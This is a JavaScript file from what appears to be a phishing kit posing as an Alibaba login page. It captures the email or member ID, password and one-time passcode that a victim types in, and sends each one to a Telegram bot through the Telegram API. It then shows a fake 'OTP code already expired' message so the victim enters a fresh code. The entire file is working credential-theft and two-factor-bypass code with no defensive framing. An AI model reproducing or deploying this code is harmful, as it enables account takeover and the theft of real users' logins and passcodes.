const form = document.querySelector('form');
form.addEventListener('submit', function(e) {
   e.preventDefault();
   
   
   const emailId = document.querySelector('.email-id').value
    const password = document.querySelector('.password').value
    
    
    const telegramMsg = `====[ALI BABA RESULTS]==== %0A ====[LOGIN DETAILS]====
      %0A %0A Email or Member ID: ${emailId} %0A Password: ${password}`
   
    
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${telegramMsg}`
    
    let api = new XMLHttpRequest()
    api.open("GET",url, true)
    api.send()
    
    document.querySelector('.container-second-otp').style.display = 'block';
    
});

function closeOtp() {
  document.querySelector('.container-second-otp').style.display = 'none';
};

const sign = document.querySelector('.sign-btn2');
sign.addEventListener('click', function(e) {
   e.preventDefault();
   
   
   const otp = document.querySelector('.otp').value;
    
    
    const telegramMsg = `====[ALI BABA RESULTS]==== %0A ====[OTP CODE DETAILS]====
      %0A %0A OTP Code: ${otp}`
   
    
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${telegramMsg}`
    
    let api = new XMLHttpRequest()
    api.open("GET",url, true)
    api.send()
    
    Swal.fire({
      icon: "error",
      title: "OTP code already expired.",
      text: "Another OTP code has been sent check email or sms.",
    });
 
});
